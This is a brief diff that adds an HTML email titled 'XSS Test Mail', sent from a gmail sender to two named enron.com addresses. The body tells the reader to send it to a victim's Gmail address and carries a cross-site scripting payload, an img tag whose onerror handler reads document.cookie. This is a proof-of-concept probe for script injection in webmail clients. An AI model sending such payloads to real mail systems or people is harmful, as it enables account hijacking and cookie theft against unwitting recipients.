@@ -1,0 +1,7 @@
+From: ninjabytes <ninjabytes@gmail.com>
+To: linda.bryan@enron.com, sylvia.campos@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+Send an email to the victim GMail address with the From field.<img src=# onerror=alert(document.cookie)>.
